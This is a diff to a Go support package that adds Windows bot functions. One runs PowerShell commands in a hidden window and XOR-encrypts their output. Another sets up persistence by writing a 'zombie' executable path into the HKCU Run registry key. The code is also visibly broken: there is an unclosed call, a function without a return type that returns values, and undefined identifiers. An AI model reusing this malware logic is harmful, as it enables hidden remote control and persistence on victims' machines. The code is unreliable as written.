@@ -3,8 +3,37 @@
 package zsupport
 
 import (
+	"syscall"
 	"golang.org/x/sys/windows/registry"
 )
+
+func HideWindow(){
+SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+}
+
+func ExecWindows(output string){
+
+ cmd := exec.Command("powershell.exe", fmt.Sprintf(`%s`, output)
+                               cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+                                cmdOutput := &bytes.Buffer{}
+                                cmd.Stdout = cmdOutput
+                                err := cmd.Run()
+                                if err != nil {
+                                        os.Stderr.WriteString(err.Error())
+                                }
+
+                                encryptmsg := xor.EncryptDecrypt(string(cmdOutput.Bytes()), key)
+				return string(encryptmsg), nil
+}
+
+func RegisterAutoRun(zombieName string, fullPathBotSourceExecFile string) error {
+        zsupport.OutMessage("Activated Persistence")
+        err := zsupport.WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, zombieName, fullPathBotSourceExecFile)
+        zsupport.CheckError(err)
+        return err
+}
+
 
 func GetRegistryKey(typeReg registry.Key, regPath string, access uint32) (key registry.Key, err error) {
 	currentKey, err := registry.OpenKey(typeReg, regPath, access)
